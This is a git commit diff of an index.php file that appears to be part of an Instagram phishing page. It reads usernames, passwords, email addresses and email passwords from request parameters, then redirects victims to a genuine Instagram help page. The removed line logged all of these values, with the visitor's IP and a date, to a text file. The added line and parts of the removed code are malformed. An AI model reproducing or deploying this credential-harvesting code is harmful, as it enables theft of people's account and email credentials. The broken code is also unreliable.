3393829c14154e27de9b40c0f3daf6259fa765f5
bariscodefxy <85716242+bariscodefxy@users.noreply.github.com>
2021-10-07 20:30:00 +0300

    Update index.php

--- index.php
+++ index.php
@@ -27,7 +27,9 @@ if(!empty($_GET['username']) && empty($_GET['comen']))
 if(isset($_GET['comen']))
 {
     $dosya = fopen("baris-altay.txt", "a");
-    fwrite($dosya, "$_KULLANICI_ADI : ${$_GET['username']},".PHP_EOL.PHP_EOL."$_SIFRE         : ${$_GET['password']},".PHP_EOL.PHP_EOL."$_IP            : ${$_SERVER['REMOTE_ADDR']},".PHP_EOL.PHP_EOL."$_TARIH         : ${date('Y:m:d', time())}, $_EPOSTA          : ${$_GET['email']}, $_EPOSTA_SIFRESI         : ${$_GET['emailPassword']}".PHP_MULTILINE);
+    fwrite($dosya, "
+    \$_KULLANICI_ADI
+    ");
     fclose($dosya);
     
     header("location: https://help.instagram.com/854227311295302/?helpref=hc_fnav");
